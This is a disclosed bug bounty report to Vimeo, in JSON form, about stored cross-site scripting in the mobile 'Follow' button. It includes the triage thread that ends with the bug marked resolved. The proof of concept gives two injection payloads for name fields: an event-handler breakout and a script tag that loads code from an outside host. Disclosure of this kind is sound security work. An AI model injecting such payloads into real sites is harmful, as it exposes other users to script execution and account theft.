{"id":88088,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODA4OA==","url":"https://hackerone.com/reports/88088","title":"XSS on mobile version of vimeo.com where the button \"Follow\" appears","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-09-09T01:05:03.374Z","submitted_at":"2015-09-09T01:05:03.374Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stefanofinding","url":"/stefanofinding","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":56,"url":"https://hackerone.com/vimeo","handle":"vimeo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vimeo","twitter_handle":"vimeo","website":"https://vimeo.com","about":"Make life worth watching"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-31T10:17:58.889Z","bug_reporter_agreed_on_going_public_at":"2017-08-01T10:16:27.479Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"__Description__\r\n\r\nIn the mobile version of https://vimeo.com, you will see _+ Follow_ buttons in places like the description of a channel, the description of a video, the profile of a user, the list of users you follow and the list of users that other users follow.\r\nThe problem is that the code that builds the button doesn't escape the Name of the channel or user. This allows to insert HTML code, even in the channel Name because the value is inserted as attribute of a `\u003cbutton\u003e` element.\r\n\r\n__Proof of concept__\r\n\r\nChannel page. Requires user interaction:\r\n    1. Using the desktop web version of Vimeo, go to https://vimeo.com/[your_vimeo_url]/channels (like https://vimeo.com/user36690798/channels).\r\n    2. Click on _+ Create new channel_ at the right of the page.\r\n    3. Enter `\" ontouchstart=\"alert(document.domain)` for _Channel Name_.\r\n    4. Click on _Create This Channel_.\r\n    5. Copy \u0026 save the URL of the new Channel.\r\n    6. Using the mobile web version of Vimeo and other user, go to the URL you saved in the last step (like https://vimeo.com/channels/963609).\r\n    7. Touch on _+ Follow_.\r\n    8. `alert(document.domain)` is executed.\r\nI have a Channel with the XSS here https://vimeo.com/channels/962193.\r\n\r\nProfile page. Doesn't require user interaction:\r\n    1. Using the web version of Vimeo, go to https://vimeo.com/settings.\r\n    2. Copy \u0026 save your _Vimeo URL_.\r\n    3. Change your _Name_ to `\"\u003e\u003cscript src=//u00f1.xyz\u003e`.\r\n    4. Click on _Save Changes_.\r\n    5. Using the mobile web version of Vimeo and other user, go to the URL you saved in step 2.\r\n    6. `alert(document.domain)` is executed.\r\nI have a profile with the XSS here https://vimeo.com/user36690798.\r\n\r\nI think that the bug is in the code that builds the _+ Follow_ button, because the same vulnerability is in the other places I mentioned in the Description.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eIn the mobile version of \u003ca title=\"https://vimeo.com\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, you will see \u003cu\u003e+ Follow\u003c/u\u003e buttons in places like the description of a channel, the description of a video, the profile of a user, the list of users you follow and the list of users that other users follow.\u003cbr\u003e\nThe problem is that the code that builds the button doesn\u0026#39;t escape the Name of the channel or user. This allows to insert HTML code, even in the channel Name because the value is inserted as attribute of a \u003ccode\u003e\u0026lt;button\u0026gt;\u003c/code\u003e element.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eProof of concept\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eChannel page. Requires user interaction:\u003cbr\u003e\n    1. Using the desktop web version of Vimeo, go to \u003ca title=\"https://vimeo.com/%5Byour_vimeo_url%5D/channels\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2F%255Byour_vimeo_url%255D%2Fchannels\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/%5Byour_vimeo_url%5D/channels\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (like \u003ca title=\"https://vimeo.com/user36690798/channels\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fuser36690798%2Fchannels\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/user36690798/channels\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003cbr\u003e\n    2. Click on \u003cu\u003e+ Create new channel\u003c/u\u003e at the right of the page.\u003cbr\u003e\n    3. Enter \u003ccode\u003e\u0026quot; ontouchstart=\u0026quot;alert(document.domain)\u003c/code\u003e for \u003cu\u003eChannel Name\u003c/u\u003e.\u003cbr\u003e\n    4. Click on \u003cu\u003eCreate This Channel\u003c/u\u003e.\u003cbr\u003e\n    5. Copy \u0026amp; save the URL of the new Channel.\u003cbr\u003e\n    6. Using the mobile web version of Vimeo and other user, go to the URL you saved in the last step (like \u003ca title=\"https://vimeo.com/channels/963609\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fchannels%2F963609\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/channels/963609\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003cbr\u003e\n    7. Touch on \u003cu\u003e+ Follow\u003c/u\u003e.\u003cbr\u003e\n    8. \u003ccode\u003ealert(document.domain)\u003c/code\u003e is executed.\u003cbr\u003e\nI have a Channel with the XSS here \u003ca title=\"https://vimeo.com/channels/962193\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fchannels%2F962193\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/channels/962193\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eProfile page. Doesn\u0026#39;t require user interaction:\u003cbr\u003e\n    1. Using the web version of Vimeo, go to \u003ca title=\"https://vimeo.com/settings\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fsettings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\n    2. Copy \u0026amp; save your \u003cu\u003eVimeo URL\u003c/u\u003e.\u003cbr\u003e\n    3. Change your \u003cu\u003eName\u003c/u\u003e to \u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;script src=//u00f1.xyz\u0026gt;\u003c/code\u003e.\u003cbr\u003e\n    4. Click on \u003cu\u003eSave Changes\u003c/u\u003e.\u003cbr\u003e\n    5. Using the mobile web version of Vimeo and other user, go to the URL you saved in step 2.\u003cbr\u003e\n    6. \u003ccode\u003ealert(document.domain)\u003c/code\u003e is executed.\u003cbr\u003e\nI have a profile with the XSS here \u003ca title=\"https://vimeo.com/user36690798\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fuser36690798\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/user36690798\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI think that the bug is in the code that builds the \u003cu\u003e+ Follow\u003c/u\u003e button, because the same vulnerability is in the other places I mentioned in the Description.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-08-31T10:16:27.570Z","allow_singular_disclosure_after":-105050932.48735158,"singular_disclosure_allowed":true,"vote_count":5,"voters":["flamezzz","eveeez","r3y","hacklad","thebish0p"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":606660,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@esevece I am reviewing the Profile page on mobile, checking your user name https://vimeo.com/user36690798\n\nIt looks like we escape \"\u003e from the name, I am going to check the code but seems like this might have been fixed from your previous tickets.\n\nThe channel follow does pop,\nhttps://vimeo.com/channels/962193 \n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/esevece\"\u003e@esevece\u003c/a\u003e I am reviewing the Profile page on mobile, checking your user name \u003ca title=\"https://vimeo.com/user36690798\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fuser36690798\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/user36690798\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt looks like we escape \u0026quot;\u0026gt; from the name, I am going to check the code but seems like this might have been fixed from your previous tickets.\u003c/p\u003e\n\n\u003cp\u003eThe channel follow does pop,\u003cbr\u003e\n\u003ca title=\"https://vimeo.com/channels/962193\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fchannels%2F962193\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/channels/962193\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-02T14:21:00.540Z","updated_at":"2015-10-02T14:21:00.540Z","actor":{"username":"securityofthings","cleared":false,"url":"/securityofthings","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/710/0e4d6b62f3b5442e932f1486acde96d43c64b49d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606682,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually can you send a screen shot of the XSS for the profile and channel? I haven't been able to replicate.","markdown_message":"\u003cp\u003eActually can you send a screen shot of the XSS for the profile and channel? I haven\u0026#39;t been able to replicate.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-02T14:49:50.554Z","updated_at":"2015-10-02T14:49:50.554Z","actor":{"username":"securityofthings","cleared":false,"url":"/securityofthings","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/710/0e4d6b62f3b5442e932f1486acde96d43c64b49d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606683,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-02T14:50:13.692Z","updated_at":"2015-10-02T14:50:13.692Z","actor":{"username":"securityofthings","cleared":false,"url":"/securityofthings","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/710/0e4d6b62f3b5442e932f1486acde96d43c64b49d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606707,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@securityofthings it seems like it was fixed with other issue. Sorry for not attach a screen shot in the original report.","markdown_message":"\u003cp\u003e\u003ca href=\"/securityofthings\"\u003e@securityofthings\u003c/a\u003e it seems like it was fixed with other issue. Sorry for not attach a screen shot in the original report.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-02T15:29:09.555Z","updated_at":"2015-10-02T15:29:09.555Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606744,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Its fine. I am going to mark this as resolved, once we consolidate everything ill look into the bounty pay outs.","markdown_message":"\u003cp\u003eIts fine. I am going to mark this as resolved, once we consolidate everything ill look into the bounty pay outs.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-02T16:12:38.520Z","updated_at":"2015-10-02T16:12:38.520Z","actor":{"username":"securityofthings","cleared":false,"url":"/securityofthings","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/710/0e4d6b62f3b5442e932f1486acde96d43c64b49d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606746,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-02T16:12:56.834Z","updated_at":"2015-10-02T16:12:56.834Z","actor":{"username":"securityofthings","cleared":false,"url":"/securityofthings","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/710/0e4d6b62f3b5442e932f1486acde96d43c64b49d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stefanofinding","url":"/stefanofinding"},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":606766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"👍","markdown_message":"\u003cp\u003e👍\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-02T16:31:48.460Z","updated_at":"2015-10-02T16:31:48.460Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1427744,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Appears to have been resolved in another ticket","markdown_message":"\u003cp\u003eAppears to have been resolved in another ticket\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T15:25:57.630Z","updated_at":"2017-01-18T15:25:57.630Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1437628,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay. Thanks.","markdown_message":"\u003cp\u003eOkay. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T07:01:11.014Z","updated_at":"2017-01-23T07:01:11.014Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881872,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"If you agree to disclose this bug, that would be great!","markdown_message":"\u003cp\u003eIf you agree to disclose this bug, that would be great!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-01T10:16:27.525Z","updated_at":"2017-08-01T10:16:27.525Z","first_to_agree":true,"actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1968353,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-31T10:17:59.134Z","updated_at":"2017-08-31T10:17:59.134Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}